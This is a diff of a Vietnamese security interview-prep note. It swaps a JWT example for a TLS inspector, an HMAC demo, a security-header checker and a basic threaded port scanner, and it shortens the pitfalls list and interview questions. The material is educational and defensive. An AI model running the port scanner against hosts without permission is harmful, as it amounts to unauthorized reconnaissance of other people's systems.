-SECRET_KEY = "super-secret-key-256-bits-minimum-length-for-hs256"
-ALGORITHM = "HS256"
+    with socket.create_connection((hostname, port), timeout=5) as raw:
+        with ctx.wrap_socket(raw, server_hostname=hostname) as tls:
+            cert = tls.getpeercert()
+            print(f"TLS version : {tls.version()}")
+            print(f"Cipher      : {tls.cipher()[0]}")
+            print(f"Cert subject: {dict(x[0] for x in cert['subject'])}")
+            print(f"Cert issuer : {dict(x[0] for x in cert['issuer'])}")
+            print(f"Valid until : {cert['notAfter']}")
+    return cert
 
-def create_access_token(user_id: str, roles: list) -> str:
-    """Tạo JWT access token"""
-    now = datetime.now(timezone.utc)
-    payload = {
-        "sub": user_id,           # subject
-        "iss": "https://auth.myapp.com",  # issuer
-        "aud": "https://api.myapp.com",   # audience
-        "iat": now,               # issued at
-        "exp": now + timedelta(minutes=15),  # expiry (ngắn!)
-        "jti": f"{user_id}-{int(now.timestamp())}",  # JWT ID (unique)
-        "roles": roles,
-        "token_type": "access"
-    }
-    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
+tls_connect("google.com")
 
-def verify_token(token: str) -> dict:
-    """Verify và decode JWT"""
+# ── 2. Basic Port Scanner (educational)
+import concurrent.futures
+
+def scan_port(host: str, port: int, timeout: float = 0.5) -> bool:
     try:
-        payload = jwt.decode(
-            token,
-            SECRET_KEY,
-            algorithms=[ALGORITHM],
-            audience="https://api.myapp.com",
-            issuer="https://auth.myapp.com",
-            options={
-                "verify_exp": True,
-                "verify_iat": True,
-                "verify_aud": True,
-                "verify_iss": True,
-            }
-        )
-        return payload
-    except jwt.ExpiredSignatureError:
-        raise ValueError("Token has expired")
-    except jwt.InvalidAudienceError:
-        raise ValueError("Invalid audience")
-    except jwt.InvalidIssuerError:
-        raise ValueError("Invalid issuer")
-    except jwt.InvalidTokenError as e:
-        raise ValueError(f"Invalid token: {e}")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(timeout)
+            return sock.connect_ex((host, port)) == 0
+    except Exception:
+        return False
 
-# Demo
-token = create_access_token("user-123", ["user", "admin"])
-print(f"Token: {token[:50]}...")
+def scan_host(host: str, ports: range):
+    print(f"Scanning {host}...")
+    open_ports = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        results = executor.map(lambda p: (p, scan_port(host, p)), ports)
+    for port, is_open in results:
+        if is_open:
+            open_ports.append(port)
+            print(f"  Port {port}: OPEN")
+    return open_ports
 
-# Decode (chỉ để xem, KHÔNG dùng trong production mà không verify)
-parts = token.split('.')
-header = json.loads(base64.b64decode(parts[0] + '=='))
-payload_raw = json.loads(base64.b64decode(parts[1] + '=='))
-print(f"\nHeader: {json.dumps(header, indent=2)}")
-print(f"Payload: {json.dumps(payload_raw, indent=2, default=str)}")
+# scan_host("127.0.0.1", range(1, 1025))
 
-# Verify
-try:
-    verified = verify_token(token)
-    print(f"\nVerified user: {verified['sub']}, roles: {verified['roles']}")
-except ValueError as e:
-    print(f"Error: {e}")
+# ── 3. HMAC — Message Authentication Code
+def generate_hmac(key: str, message: str) -> str:
+    """Tạo HMAC để verify message integrity (không thể giả mạo nếu không có key)"""
+    h = hmac.new(key.encode(), message.encode(), hashlib.sha256)
+    return h.hexdigest()
+
+def verify_hmac(key: str, message: str, signature: str) -> bool:
+    expected = generate_hmac(key, message)
+    return hmac.compare_digest(expected, signature)  # constant-time comparison
+
+key = "super_secret_key"
+msg = "Transfer $1000 to account 12345"
+sig = generate_hmac(key, msg)
+print(f"HMAC: {sig}")
+print(f"Valid: {verify_hmac(key, msg, sig)}")
+print(f"Tampered: {verify_hmac(key, 'Transfer $9999 to account 12345', sig)}")
+
+# ── 4. Kiểm tra HSTS và security headers
+import urllib.request
+
+def check_security_headers(url: str):
+    req = urllib.request.Request(url, headers={'User-Agent': 'SecurityCheck/1.0'})
+    with urllib.request.urlopen(req, timeout=5) as resp:
+        headers = dict(resp.headers)
+        checks = {
+            'Strict-Transport-Security': 'HSTS',
+            'Content-Security-Policy': 'CSP',
+            'X-Frame-Options': 'Clickjacking protection',
+            'X-Content-Type-Options': 'MIME sniffing protection',
+            'Referrer-Policy': 'Referrer policy',
+        }
+        for header, description in checks.items():
+            value = headers.get(header, 'MISSING')
+            status = "✓" if value != 'MISSING' else "✗"
+            print(f"  {status} {description}: {value[:60]}")
+
+# check_security_headers("https://google.com")
 ```
 
 ---
 
 ## Khi nào dùng / Khi nào KHÔNG dùng
 
-**Dùng HTTPS luôn luôn khi:**
-- Bất kỳ production web application nào
-- APIs truyền dữ liệu nhạy cảm
-- Let's Encrypt cung cấp cert miễn phí — không có lý do để không dùng
+**TLS/HTTPS — dùng luôn luôn:** không có lý do gì không dùng trong production.
 
-**Dùng JWT khi:**
-- Stateless authentication cho microservices
-- Cross-domain authentication (SSO)
-- Short-lived tokens (15 phút access token + 7 ngày refresh token)
+**Certificate Pinning — dùng khi:**
+- Mobile app với backend cố định
+- High-security app (banking, healthcare)
+- Không khuyến khích cho web (khó update khi cert thay đổi)
 
-**Không dùng JWT khi:**
-- Cần immediate revocation (logout không thể revoke JWT ngay)
-- Session data lớn (JWT có size limit)
-- Thay thế: opaque token + token introspection endpoint
+**VPN — dùng khi:**
+- Remote access vào internal network
+- Site-to-site connection giữa văn phòng
+- Bypass geo-restriction (với điều kiện hợp lệ)
 
-**Dùng OAuth 2.0 khi:**
-- Third-party authorization ("Login with Google")
-- Cần cấp quyền truy cập có phạm vi hạn chế (scopes)
-
-**Không tự viết crypto khi:**
-- Luôn dùng thư viện đã được audit: `cryptography` (Python), `libsodium`, `OpenSSL`
-- "Don't roll your own crypto" — lỗi tinh tế trong crypto implementation có thể phá vỡ mọi bảo mật
+**mTLS — dùng khi:**
+- Service-to-service trong microservices
+- API giữa các partner (B2B)
 
 ---
 
 ## Lỗi thường gặp (Common Pitfalls)
 
-1. **HTTP thay vì HTTPS**: Mọi production system phải dùng HTTPS. HTTP = plaintext = dữ liệu bị đọc/sửa dọc đường.
-
-2. **Lưu password dạng plaintext hoặc reversible**: Dùng bcrypt/Argon2 để hash password, không AES.
-
-3. **JWT secret key yếu**: `"secret"`, `"password"` là keys quá đơn giản. Dùng ít nhất 256-bit random key.
-
-4. **Không set JWT expiry**: Token không hết hạn → bị đánh cắp thì dùng mãi mãi.
-
-5. **SQL Injection qua f-string**: `f"SELECT * FROM users WHERE id={user_id}"` → luôn dùng parameterized queries.
-
-6. **CORS `Allow-Origin: *` với credentials**: Browsers sẽ chặn — không cho phép wildcard với credentials.
-
-7. **Verbose error messages**: Stack traces, SQL errors, file paths trong response → thông tin cho attacker. Log chi tiết ở server, trả về generic error cho client.
-
-8. **Không validate redirect_uri trong OAuth**: Attacker có thể redirect authorization code đến server của mình.
-
-9. **Dùng MD5/SHA1 cho mật khẩu**: Đã bị crack bởi rainbow tables. Dùng bcrypt, scrypt, Argon2.
-
-10. **Không implement rate limiting**: Login endpoint không có rate limit → brute force attack.
+- **HTTP thay vì HTTPS trong production**: mọi traffic bị nghe lén.
+- **`verify=False` trong requests**: disable certificate validation → MITM attack.
+- **JWT lưu secret trong payload**: payload chỉ base64-encoded, không mã hóa — ai cũng đọc được.
+- **Không có rate limiting**: API endpoint dễ bị brute force.
+- **CORS `Access-Control-Allow-Origin: *` cho authenticated endpoint**: ai cũng có thể gọi API từ bất kỳ domain.
+- **Lỗi timing attack khi compare secret**: dùng `==` thay vì `hmac.compare_digest()` → attacker đo thời gian so sánh để đoán secret.
+- **Firewall chỉ chặn inbound**: malware đã vào bên trong có thể tự do gửi data ra ngoài.
+- **Không có security headers**: thiếu HSTS, CSP, X-Frame-Options → dễ bị XSS, clickjacking.
 
 ---
 
 ## Câu hỏi phỏng vấn hay gặp
 
-1. **Giải thích TLS handshake hoạt động thế nào?**
-   - Client gửi ClientHello (cipher suites, key_share). Server trả ServerHello + Certificate + Finished. Client verify cert, tính shared secret từ ECDHE, gửi Finished. Cả hai derive session keys từ shared secret.
-
-2. **Symmetric vs Asymmetric encryption — khi nào dùng cái nào?**
-   - Symmetric (AES): nhanh, dùng cho bulk data encryption. Asymmetric (RSA/ECDSA): chậm, dùng để trao đổi key và chữ ký số. TLS dùng hybrid: asymmetric để trao đổi key, sau đó symmetric.
-
-3. **Forward Secrecy là gì? Tại sao quan trọng?**
-   - Mỗi session dùng ephemeral key pair mới. Ngay cả khi private key server bị lộ sau này, attacker không thể decrypt traffic đã ghi trước đó. ECDHE trong TLS 1.3 cung cấp forward secrecy.
-
-4. **Sự khác biệt giữa authentication và authorization?**
-   - Authentication (authn): xác nhận "Bạn là ai?" (login, verify identity). Authorization (authz): xác nhận "Bạn được làm gì?" (permissions, access control).
-
-5. **Giải thích CSRF attack và cách phòng.**
-   - CSRF: attacker trick browser của victim gửi request đến site victim đã authenticated. Phòng: CSRF token (verify per-request random token), SameSite cookie, verify Origin/Referer header.
-
-6. **JWT có thể bị tấn công thế nào?**
-   - `alg: none` attack (verify signature bị bypass). Weak secret (brute force). Không verify exp → expired token dùng được. Sensitive data trong payload (không mã hóa, chỉ encode base64). Missing audience/issuer validation.
-
-7. **OAuth 2.0 Authorization Code flow với PKCE là gì?**
-   - PKCE (Proof Key for Code Exchange) chống authorization code interception. Client tạo code_verifier, gửi SHA256 hash (code_challenge) với request. Khi exchange code for token, gửi code_verifier để verify.
-
-8. **Tại sao không nên lưu JWT trong localStorage?**
-   - XSS có thể đọc localStorage và đánh cắp token. Nên dùng HttpOnly cookie: JS không đọc được, browser tự gửi kèm request. Nhưng cookie cần CSRF protection. Trade-off: localStorage đơn giản hơn, HttpOnly cookie an toàn hơn với XSS.
+- Stateful vs Stateless firewall — sự khác biệt?
+- MITM attack là gì? TLS ngăn chặn thế nào?
+- SYN flood là gì? SYN cookies giải quyết ra sao?
+- Perfect Forward Secrecy là gì và tại sao quan trọng?
+- JWT có những vấn đề bảo mật gì? Cách giải quyết?
+- mTLS khác TLS thông thường như thế nào?
+- IDS vs IPS — vị trí trong mạng và cách hoạt động?
+- Zero Trust Architecture là gì? Tại sao cần?
+- HSTS là gì? Tại sao ngăn được downgrade attack?
+- OAuth 2.0 Authorization Code flow hoạt động như thế nào?
